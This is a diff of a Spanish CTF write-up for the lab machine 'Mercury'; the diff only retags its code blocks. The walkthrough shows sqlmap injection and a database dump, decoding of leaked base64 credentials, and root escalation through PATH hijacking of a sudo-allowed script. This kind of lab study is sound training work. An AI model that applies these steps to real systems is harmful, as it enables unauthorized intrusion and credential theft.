@@ -19,7 +19,7 @@ IP Victima: 192.168.0.31
 
 ### Nmap
 
-```
+```bash
 datadiego@~ nmap -Pn 192.168.0.31
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 10:50 CET
 Nmap scan report for 192.168.0.31
@@ -34,20 +34,20 @@ PORT     STATE SERVICE
 
 En la maquina hay un servidor http, en el index solo hay un mensaje en plano:
 
-```
+```text
 Hello. This site is currently in development please check back later.
 ```
 
 Existe un robots.txt:
 
-```
+```text
 User-agent: * 
 Disallow: /
 ```
 
 Si intentamos entrar a cualquier otra pagina que no existe:
 
-```
+```text
 
 Page not found (404)
 Request Method: 	GET
@@ -72,7 +72,7 @@ Cuando accedemos a /mercuryfacts encontramos otros dos endpoints:
 - /mercuryfacts/:number
 
 En la lista de /todo:
-```
+```text
  Still todo:
 
     Add CSS.
@@ -83,13 +83,13 @@ En la lista de /todo:
 
 Lanzamos sqlmap:
 
-```
+```bash
 sqlmap -u http://192.168.0.31:8080/mercuryfacts/ --dbs --batch
 ```
 
 Encuentra lo siguiente:
 
-```
+```bash
 sqlmap identified the following injection point(s) with a total of 1876 HTTP(s) requests:
 ---
 Parameter: #1* (URI)
@@ -119,13 +119,13 @@ available databases [2]:
 
 Sacamos datos de las tablas con:
 
-```
+```bash
 sqlmap -u http://192.168.0.31:8080/mercuryfacts/ --current-db -D mercury --batch --dump-all
 ```
 
 Encontramos lo siguiente:
 
-```
+```bash
 [05:50:50] [INFO] fetching entries for table 'users' in database 'mercury'
 Database: mercury
 Table: users
@@ -144,7 +144,7 @@ Ningun usuario funciona en SSH excepto `webmaster`
 
 Encontramos la user_flag.txt:
 
-```
+```text
 user_flag_8339915c9a454657bd60ee58776f4ccd
 ```
 
@@ -153,7 +153,7 @@ linuxmaster:x:1002:1002:,,,:/home/linuxmaster:/bin/bash
 
 Encontramos el hash de ambos:
 
-```
+```bash
 webmaster@mercury:~$ cat mercury_proj/notes.txt 
 Project accounts (both restricted):
 webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
@@ -162,14 +162,14 @@ linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg
 
 Descodificamos la contraseña:
 
-```
+```bash
 webmaster@mercury:~/mercury_proj/mercury_proj$ echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d
 mercurymeandiameteris4880km
 ```
 
 Entramos por SSH o mediante `su linuxmaster` y comprobamos permisos con sudo -l:
 
-```
+```bash
 linuxmaster@mercury:~$ sudo -l
 [sudo] password for linuxmaster: 
 Matching Defaults entries for linuxmaster on mercury:
@@ -182,7 +182,7 @@ User linuxmaster may run the following commands on mercury:
 
 Comprobamos el archivo:
 
-```
+```bash
 linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh 
 #!/bin/bash
 tail -n 10 /var/log/syslog
@@ -192,13 +192,13 @@ El comando se esta ejecutando directamente, sin especificar la ruta absoluta, po
 
 Podemos hacer lo siguiente:
 
-```
+```bash
 linuxmaster@mercury:~$ mkdir /tmp/malito
 ```
 
 Dentro del directorio, creamos un `.sh` que ejecute una shell con nano:
 
-```
+```bash
 #!/bin/bash
 /bin/bash
 ```
@@ -209,7 +209,7 @@ Ejecutamos el script utilizando la variable de entorno con `sudo --preserve-env=
 
 Obtenemos acceso a root!
 
-```
+```bash
 linuxmaster@mercury:~$ cd /tmp/malito/
 linuxmaster@mercury:/tmp/malito$ ls
 linuxmaster@mercury:/tmp/malito$ nano tail
